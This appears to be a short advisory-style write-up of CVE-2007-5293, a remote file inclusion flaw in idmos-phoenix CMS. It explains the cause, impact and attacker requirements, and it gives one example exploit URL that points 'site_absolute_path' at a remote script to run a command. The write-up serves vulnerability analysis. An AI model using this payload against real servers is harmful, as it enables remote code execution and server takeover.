Based on the provided content, here's an analysis of CVE-2007-5293:

**Root Cause of Vulnerability:**
The vulnerability is a Remote File Inclusion (RFI) vulnerability in the `aural.php` file of the idmos-phoenix CMS. The `site_absolute_path` parameter in `aural.php` is vulnerable to RFI.

**Weaknesses/Vulnerabilities Present:**
- **Remote File Inclusion (RFI):** The application includes external files via user-supplied input without proper sanitization or validation.
- **Cross-Site Scripting (XSS):**  There are also XSS vulnerabilities in `error.php` and `templates/simple/ia.php`. However, these are not related to CVE-2007-5293.

**Impact of Exploitation:**
- **RFI:** An attacker can include and execute arbitrary code from a remote server on the vulnerable web server. This can lead to complete compromise of the server, including data theft, malware deployment, and denial of service.

**Attack Vectors:**
- **HTTP GET Request:** The attacker can exploit the RFI vulnerability by sending a specially crafted HTTP GET request to the vulnerable `aural.php` file, specifying the malicious file path in the `site_absolute_path` parameter.
Example URL:
```
core/aural.php?site_absolute_path=http://localhost/cmd.txt?&cmd=dir
```

**Required Attacker Capabilities/Position:**
- The attacker needs to be able to send HTTP requests to the vulnerable server.
- The attacker needs to have a web server to host the malicious code.
